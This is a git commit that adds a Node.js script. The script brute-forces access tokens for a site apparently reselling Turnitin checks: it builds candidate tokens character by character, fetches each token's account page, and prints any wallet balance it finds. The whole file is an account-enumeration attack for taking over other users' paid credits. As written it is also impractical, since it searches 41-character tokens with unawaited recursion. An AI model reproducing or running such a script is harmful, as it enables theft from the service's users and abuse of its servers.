50cbcdeb8322e7f5269bbe5c878d8b3b28f783c7
codetieutu <nhanguyenbinhtri@gmail.com>
2025-03-21 09:49:59 +0700

    first add

---
+++ index.js
@@ -0,0 +1,27 @@
+const axios = require("axios")
+const cheerio = require("cheerio")
+
+const checkToken = async (token) => {
+    try {
+        const res = await axios.get(`https://turnitin.report/turnitin/ext/acc/${token}/`)
+        const $ = cheerio.load(res.data);
+        const text = $("#turnitin-slots-wallet").text();
+        console.log(`${token}|${text ? text : "0"}`);
+        return;
+    }
+    catch (err) {
+    }
+
+}
+
+let letter = "abcdefghijklmnopqrstuvwxyz0123456789";
+let generateToken = async (index, temp = "") => {
+    if (index > 40) {
+        await checkToken(temp);
+    } else {
+        for (let i = 0; i < letter.length; i++) {
+            generateToken(index + 1, temp + letter.charAt(i));
+        }
+    }
+}
+generateToken(0);
